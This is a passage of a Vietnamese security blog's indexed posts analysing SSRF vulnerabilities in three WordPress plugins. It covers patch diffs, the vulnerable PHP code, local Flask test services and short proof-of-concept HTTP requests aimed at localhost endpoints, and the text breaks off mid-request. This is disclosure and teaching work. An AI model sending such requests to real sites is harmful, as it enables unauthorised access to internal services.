$link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code protected function is_url_unsafe( $url ) { $parts = wp_parse_url( $url ); if ( ! isset( $parts[ 'scheme' ], $parts[ 'host' ] ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: invalid or malformed URL', 'link' =\u003e $url ]; } $scheme = strtolower( $parts[ 'scheme' ] ); if ( ! in_array( $scheme, [ 'http', 'https' ], true ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: unsupported URL scheme', 'link' =\u003e $url ]; } $host = $parts[ 'host' ]; $records = @dns_get_record( $host, DNS_A + DNS_AAAA ); $ips = []; if ( is_array( $records ) \u0026\u0026 count( $records ) ) { foreach ( $records as $record ) { if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'A' \u0026\u0026 ! empty( $record[ 'ip' ] ) ) { $ips[] = $record[ 'ip' ]; } if ( isset( $record[ 'type' ] ) \u0026\u0026 $record[ 'type' ] === 'AAAA' \u0026\u0026 ! empty( $record[ 'ipv6' ] ) ) { $ips[] = $record[ 'ipv6' ]; } } } else { $resolved = gethostbyname( $host ); if ( $resolved \u0026\u0026 $resolved !== $host ) { $ips[] = $resolved; } } if ( empty( $ips ) ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: host could not be resolved', 'link' =\u003e $url ]; } foreach ( $ips as $ip ) { if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) === false ) { return [ 'type' =\u003e 'broken', 'code' =\u003e 0, 'text' =\u003e 'Blocked: resolved to internal or reserved IP address', 'link' =\u003e $url ]; } } return false; // Safe } // End is_url_unsafe() Bản vá đã bổ sung hàm is_url_unsafe(). Trước khi gọi wp_remote_get(), URL được kiểm tra chi tiết: chỉ cho phép scheme http và https, xác thực host hợp lệ, thực hiện resolve DNS để lấy IP và chặn tất cả các IP nội bộ hoặc thuộc dải reserved. Nếu URL không hợp lệ hoặc không an toàn, hàm sẽ trả về thông tin chi tiết về việc block và không thực hiện request, từ đó ngăn chặn SSRF hiệu quả. Bản vá đảm bảo rằng chỉ các URL an toàn mới được phép gọi, giảm thiểu rủi ro tấn công từ bên ngoài. ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rpublic function check_url_status_code( $url, $timeout = null ) { // Get the 'allow_redirects' option and sanitize it $allow_redirects = filter_var( get_option( 'blnotifier_allow_redirects' ), FILTER_VALIDATE_BOOLEAN ); // Determine the request method based on allow_redirects option $request_method = $allow_redirects ? 'GET' : 'HEAD'; // Force giving head for images, videos, and audio files if ( $request_method == 'GET' ) { $file_extension = strtolower( pathinfo( $url, PATHINFO_EXTENSION ) ); if ( in_array( $file_extension, $this-\u003eget_force_head_file_types() ) ) { $request_method = 'HEAD'; } } // User agent $user_agent = $this-\u003eget_user_agent( $url ); // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } // Check if from youtube if ( $watch_url = $this-\u003eis_youtube_link( $link ) ) { $link = 'https://www.youtube.com/oembed?format=json\u0026url='.$watch_url; } // The request args // See https://developer.wordpress.org/reference/classes/WP_Http/request/ $http_request_args = apply_filters( 'blnotifier_http_request_args', [ 'method' =\u003e $request_method, 'timeout' =\u003e $timeout, 'redirection' =\u003e absint( get_option( 'blnotifier_max_redirects', 5 ) ), 'httpversion' =\u003e '1.1', 'sslverify' =\u003e filter_var( get_option( 'blnotifier_ssl_verify', true ), FILTER_VALIDATE_BOOLEAN ), 'user-agent' =\u003e $user_agent ], $url ); // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } // Let's make invalid URL 0 codes broken if ( $code === 0 \u0026\u0026 ( $error == 'A valid URL was not provided.' || strpos( $error, 'cURL error 6: Could not resolve host' ) !== false ) ) { $code = 666; } // Possible Codes $codes = $this-\u003eget_status_codes(); // Files too large if ( $request_method == 'GET' ) { $content_length = wp_remote_retrieve_header( $response, 'content-length' ); if ( $content_length \u0026\u0026 $content_length \u003e 10 * 1024 * 1024 ) { // 10 MB $code = 413; } } // Bad links if ( in_array( $code, $this-\u003eget_bad_status_codes() ) ) { $type = 'broken'; // Warnings } elseif ( in_array( $code, $this-\u003eget_warning_status_codes() ) ) { $type = 'warning'; // Good links } else { $type = 'good'; } // Filter status $status = apply_filters( 'blnotifier_status', [ 'type' =\u003e $type, 'code' =\u003e $code, 'text' =\u003e ( $code !== 0 \u0026\u0026 ( isset( $codes[ $code ] ) \u0026\u0026 $codes[ $code ][ 'msg' ] != '' ) ) ? $codes[ $code ][ 'msg' ] : $error, 'link' =\u003e $url ] ); // Return the array return $status; } // End check_url_status_code Hàm check_url_status_code() có nhiệm vụ kiểm tra trạng thái của một URL và phân loại nó là good (tốt), warning (cảnh báo) hoặc broken (hỏng). Cụ thể, hoạt động của hàm gồm các bước chính: Lấy tùy chọn cấu hình Lấy tùy chọn blnotifier_allow_redirects từ database và chuyển về boolean → Quyết định xem request sẽ dùng GET hay HEAD. Chọn phương thức request Nếu allow_redirects = true, mặc định dùng GET. Nếu URL là file media (hình ảnh, video, audio), hàm sẽ ép dùng HEAD để tránh tải toàn bộ file lớn. Ghi chú\rTùy chọn này được thiết lập tại http://localhost/wp-admin/admin.php?page=broken-link-notifier\u0026tab=settings Allow Redirect settings\rXác định user-agent Hàm gọi $this-\u003eget_user_agent() để lấy user-agent phù hợp cho request. Chuẩn hóa URL Nếu URL bắt đầu bằng / → nối với home_url() để thành URL tuyệt đối. Nếu URL là link YouTube, chuyển sang endpoint oembed để lấy thông tin an toàn mà không cần truy cập trực tiếp video. Cấu hình request: Xây dựng mảng $http_request_args chứa các thông số cho request: method (GET/HEAD) timeout redirection (số lần redirect tối đa) sslverify (có kiểm tra SSL hay không) user-agent Thực hiện request Gọi wp_remote_get($link, $http_request_args) để lấy response. Nếu không lỗi → lấy status code từ server. Nếu lỗi → lấy thông báo lỗi. Xử lý các URL không hợp lệ Một số lỗi cơ bản như không cung cấp URL hợp lệ hoặc k","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph LR\rA[Anonymous Client gửi URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get với URL user cung cấp]\rE --\u003e F[Response từ server]\rgraph LR\rA[Anonymous Client gửi URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get với URL user cung cấp]\rE --\u003e F[Response từ server]\rgraph LR\rA[Anonymous Client gửi URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get với URL user cung cấp]\rE --\u003e F[Response từ server]\rgraph LR\rA[Anonymous Client gửi URL] --\u003e B[ajax_blinks]\rB --\u003e C[check_link]\rC --\u003e D[check_url_status_code]\rD --\u003e E[wp_remote_get với URL user cung cấp]\rE --\u003e F[Response từ server]\r","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Local Server\rTạo local service đơn giản bằng python from flask import Flask, request import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/delete', methods=['GET']) def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#local-server"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTruy cập trang chủ và lấy nonce Gửi POST request đến endpoint POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=blnotifier_blinks\u0026nonce=87f4d1ef16\u0026source_url=http://localhost:8001/\u0026header_links[0]=http://127.0.0.1:8001/delete?id=1 Result: Gửi thành công request tới local service\r","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤1.3.0 của Broken Link Notifier có lỗ hổng SSRF: endpoint cho phép anonymous truyền URL, dẫn đến wp_remote_get() gọi tới dịch vụ nội bộ. Bản 1.3.1 đã thêm kiểm tra DNS/IP và giới hạn quyền, ngăn chặn SSRF trước khi thực hiện request. ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rNâng cấp ngay lên ≥1.3.1. Không tin URL từ client — validate/allowlist trước khi fetch. Chặn IP nội bộ (resolve DNS, block private/reserved). Giới hạn quyền endpoint (không cho anonymous). Trả status thay vì body thô khi không cần nội dung. ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Broken Link Notifier Plugin \u003c= 1.3.0 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress PopupKit Plugin.","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers cho WordPress tồn tại lỗ hổng Server-Side Request Forgery (SSRF) trong tất cả các phiên bản từ đầu đến 2.1.4 (bao gồm cả 2.1.4). Nguyên nhân là do thiếu kiểm tra hợp lệ (insufficient validation) đối với các URL được truyền thông qua tham số URL. Điều này cho phép kẻ tấn công chưa xác thực (unauthenticated attackers) gửi các web request đến địa chỉ tùy ý xuất phát từ ứng dụng web, có thể được lợi dụng để truy vấn hoặc chỉnh sửa thông tin từ các dịch vụ nội bộ (internal services), cũng như thực hiện hoạt động trinh sát mạng (network reconnaissance). Lỗ hổng này đã được vá một phần (partially patched) trong phiên bản 2.1.4. CVE ID: CVE-2025-10861 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.1.4 Patched Versions: 2.1.5 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress PopupKit Plugin ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - PopupKit: 2.1.3 (vulnerable) và 2.1.5 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rVì 1 phần mã nguồn đã được vá trong phiên bản 2.1.4 nên ta sẽ sử dụng phiên bản 2.1.3 để phân tích. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview', 'methods' =\u003e 'POST', 'callback' =\u003e 'fetch_external_content', 'permission_callback' =\u003e '__return_true', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } Trong phiên bản 2.1.3, plugin định nghĩa một API với POST method có permission_callback =\u003e __return_true, cho phép mọi người dùng, bao gồm cả anonymous user, thực thi hàm fetch_external_content() với tham số url bắt buộc. Hàm này sử dụng wp_remote_get để gửi request đến URL được truyền vào và trả lại nội dung phản hồi (response body). Do không có bất kỳ cơ chế kiểm soát hoặc lọc URL nội bộ nào, điều này khiến kẻ tấn công có thể gửi request đến các dịch vụ nội bộ (internal services) dẫn đến lỗ hổng Server-Side Request Forgery (SSRF) có thể khai thác bởi anonymous user. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview-template', 'methods' =\u003e 'GET', 'callback' =\u003e 'fetch_external_content', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_safe_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } Trong bản vá 2.1.5, plugin đã thực hiện một số thay đổi nhằm giảm thiểu nguy cơ Server-Side Request Forgery (SSRF): Đổi endpoint từ /live-preview sang /live-preview-template. Thay thế hàm wp_remote_get() bằng wp_safe_remote_get(), giúp WordPress tự động chặn các request đến địa chỉ nội bộ như localhost, 127.0.0.1, hoặc 169.254.*. Nhờ vậy, các yêu cầu từ người dùng đến tài nguyên nội bộ của máy chủ sẽ bị chặn, ngăn chặn khả năng khai thác SSRF. ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rHàm get_routes() được gọi bên trong register_routes(): protected $namespace = 'pbb/v1'; public function register_routes() { $routes = $this-\u003eget_routes(); foreach ($routes as $route) { register_rest_route( $this-\u003enamespace, $route['endpoint'], [ 'methods' =\u003e $route['methods'], 'callback' =\u003e [$this, $route['callback']], 'permission_callback' =\u003e isset($route['permission_callback']) ? $route['permission_callback'] : [$this, 'permission_callback'], ] ); } } public function permission_callback(): bool { return current_user_can('manage_options'); } Khi register_routes() được thực thi, tất cả các route được trả về từ get_routes() sẽ được đăng ký vào WordPress REST API thông qua hàm register_rest_route(). Ở đây: Mỗi route sẽ ánh xạ tới một endpoint, method và callback tương ứng. Nếu route không có khóa permission_callback, plugin sẽ tự động gán mặc định là $this-\u003epermission_callback, yêu cầu người dùng phải có quyền manage_options (thường chỉ có admin). Tuy nhiên, trong phiên bản 2.1.3, route /live-preview lại được khai báo thủ công với permission_callback =\u003e '__return_true', nghĩa là bỏ qua cơ chế kiểm tra quyền ở trên, dẫn đến việc bất kỳ ai (kể cả anonymous user) cũng có thể gọi API này. Khi gửi yêu cầu POST đến endpoint /wp-json/pbb/v1/live-preview, hàm fetch_external_content() sẽ được thực thi. Hàm này nhận giá trị url từ tham số yêu cầu, thực hiện fetch request tới địa chỉ đó và trả về body của phản hồi. ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Local Server\rTạo local service đơn giản bằng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#local-server"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rGửi POST request đến endpoint POST /wp-json/pbb/v1/live-preview HTTP/1.1 Host: localhost ... url=http://localhost:8001/metadata Result: Nội dung đọc được từ local service\r","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤ 2.1.4 của PopupKit có lỗ hổng SSRF: endpoint /wp-json/pbb/v1/live-preview cho phép anonymous gọi fetch_external_content() với tham số url từ client; hàm này dùng wp_remote_get() và trả về trực tiếp phần body, do đó có thể bị lợi dụng để truy vấn các dịch vụ nội bộ. Bản 2.1.5 đã chuyển sang wp_safe_remote_get() và giới hạn quyền truy cập (chỉ admin), giúp giảm rủi ro. ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rCập nhật lên 2.1.5+. Không tin URL client — xác thực/allowlist trước khi fetch. Dùng wp_safe_remote_get() và kiểm tra thêm (redirects, DNS). Không dùng permission_callback =\u003e __return_true; giới hạn quyền. Không trả nguyên body thô nếu không cần thiết. ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress PopupKit Plugin \u003c= 2.1.4 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Spectra Plugin.","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rLỗ hổng Server Side Request Forgery (SSRF) đã được phát hiện trong plugin WordPress Spectra (trước đây gọi là Ultimate Addons cho Gutenberg) ảnh hưởng đến các phiên bản lên tới 2.6.6. CVE ID: CVE-2023-36679 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.6.6 Patched Versions: 2.6.7 CVSS severity: Low (7.1) Required Privilege: Contributor Product: WordPress Spectra Plugin ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Spectra: 2.6.6 (vulnerable) và 2.6.7 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rBản lỗi: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $api_uri = ( isset( $_REQUEST['api_uri'] ) ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } Trong phiên bản 2.6.6, hàm template_importer() nhận tham số api_uri trực tiếp từ biến $_REQUEST và sử dụng giá trị này để gửi HTTP request thông qua hàm wp_remote_get(): Do không có bước xác thực hoặc giới hạn nguồn, kẻ tấn công có thể cung cấp một URL tùy ý để ép máy chủ thực hiện request đến các địa chỉ nội bộ. Điều này tạo ra lỗ hổng Server-Side Request Forgery (SSRF). Bản vá: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $block_id = isset( $_REQUEST['id'] ) ? absint( $_REQUEST['id'] ) : ''; $block_data = get_option( 'ast-block-templates_data-' . $block_id ); $api_uri = null !== $block_data ? $block_data-\u003e{'astra-page-api-url'} : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } Bản vá đã loại bỏ việc nhận URL trực tiếp từ người dùng. Thay vào đó, mã chỉ nhận ID của block thông qua $_REQUEST['id'] và truy xuất URL tương ứng từ cơ sở dữ liệu (wp_options) bằng khóa ast-block-templates_data-{id}: Nhờ đó, URL được giới hạn trong các bản ghi được quản lý sẵn trong hệ thống, loại bỏ khả năng người dùng tự cung cấp đường dẫn tùy ý. Cơ chế này giúp ngăn chặn hoàn toàn nguy cơ SSRF và tăng tính an toàn khi gọi API từ phía máy chủ. ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rtemplate_importer() yêu cầu người dùng có đặc quyền từ Contributor trở lên if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } Xác thực nonce chống csrf với tên nonce là _ajax_nonce, nếu nonce không khớp =\u003e thoát khỏi logic và gửi lỗi. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); Mẹo Lỗ hổng được công bố yêu cầu đặc quyền Contributor, nên giá trị _ajax_nonce rất có khả năng xuất hiện trong mã nguồn giao diện Admin. Với các lỗ hổng liên quan tới quyền Contributor thường gắn với chức năng tạo bài viết, bạn có thể tìm _ajax_nonce bằng cách inspect phần tạo/sửa post trong trang quản trị (hoặc tìm trong script/HTML mà trang Admin sinh ra). _ajax_nonce trong response\rSau các bước xác thực, mã lấy trực tiếp giá trị api_uri từ $_REQUEST, gọi esc_url_raw() rồi ghép tham số truy vấn và thực hiện cuộc gọi HTTP bằng wp_remote_get() $api_uri = isset( $_REQUEST['api_uri'] ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = array( '_fields' =\u003e 'original_content' ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); $response = wp_remote_get( $demo_api_uri, $api_args ); Cuối cùng sẽ decode response và trả về dạng JSON với key original_content $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); template_importer() được đăng ký làm callback cho action hook: add_action( 'wp_ajax_ast_block_templates_importer', array( $this, 'template_importer' ) ); Tức, khi truy cập endpoint /wp-admin/admin-ajax/php với action=ast_block_templates_importer thì template_importer() được gọi. ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Local Server\rTạo local service đơn giản bằng python from flask import Flask, jsonify, request, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/test') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/#local-server"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo post và lấy _ajax_nonce Gửi request với api_uri trỏ đến local service http://127.0.0.1:8001/test bằng user Contributor POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: application/json, text/javascript, */*; q=0.01 Cookie: 